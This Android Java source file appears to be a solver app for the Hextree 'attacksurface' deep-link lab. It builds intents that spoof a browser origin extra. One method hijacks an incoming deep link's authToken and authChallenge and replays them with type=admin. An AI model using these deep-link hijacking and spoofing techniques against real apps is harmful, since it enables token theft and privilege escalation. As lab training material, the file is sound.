package com.bedo.poc_app;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class Deeplink_Labs extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_deeplink_labs);

    }

    public void Flag13(View view) {

        Intent DeepLink = new Intent("android.intent.action.VIEW").setClassName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag13Activity"
                )
                .addCategory("android.intent.category.BROWSABLE")
                .putExtra("com.android.browser.application_id","No Check");

        Uri uri = Uri.parse("hex://flag?action=give-me");
        DeepLink.setData(uri);
        startActivity(DeepLink);
    }

    public void Flag14(View view) {
        Intent HijackData = getIntent();
        Uri data = HijackData.getData();
        String action = HijackData.getAction();
        if("android.intent.action.VIEW".equals(action)){
            String authChallenge = data.getQueryParameter("authChallenge");
            String authToken = data.getQueryParameter("authToken");
            Toast.makeText(this,"action is: "+action,Toast.LENGTH_LONG).show();
            Log.d("dataHijacked",String.valueOf(data));

        Intent sendData = new Intent("android.intent.action.VIEW").setClassName("io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag14Activity");
        Uri uri = Uri.parse("hex://token?authToken="+authToken+"&type=admin&authChallenge="+authChallenge);
            sendData.setData(uri);
        startActivity(sendData);
    }}

    public void Flag15(View view) {
        Intent DeepLink = new Intent()
                .setAction("io.hextree.action.GIVE_FLAG")
                .setClassName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag15Activity"
                )
                .addCategory("android.intent.category.BROWSABLE");

        DeepLink
                .putExtra("com.android.browser.application_id","No Check")
                .putExtra("action","flag")
                .putExtra("flag",true);

        startActivity(DeepLink);

    }
}